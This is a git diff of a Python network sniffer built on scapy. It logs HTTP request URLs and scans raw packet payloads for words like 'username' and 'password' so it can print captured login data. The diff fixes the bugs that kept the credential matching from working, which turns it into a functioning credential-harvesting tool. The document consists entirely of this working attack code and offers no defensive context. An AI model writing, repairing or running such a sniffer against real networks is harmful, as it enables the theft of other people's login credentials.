@@ -16,19 +16,19 @@ def get_url(packet):
 
 def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
-        load = packet[scapy.Raw].load
+        load = str(packet[scapy.Raw].load)
         words = ["Username", "user", "username",  "uname", "login", "Password", "password", "pass"]
-        for word in words:
-            if b'word' in load:
+        for word_matched in words:
+            if word_matched in load:
                 return load
 
 
 def sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        url = str(get_url(packet))
-        print("[+] HTTP Request > " + url)
+        url = get_url(packet)
+        print("[+] HTTP Request > " + url.decode())
 
-        login_info = str(get_login_info(packet))
+        login_info = get_login_info(packet)
         if login_info:
             print("\n\n[+] Possible username/password > " + login_info + "\n\n")
 
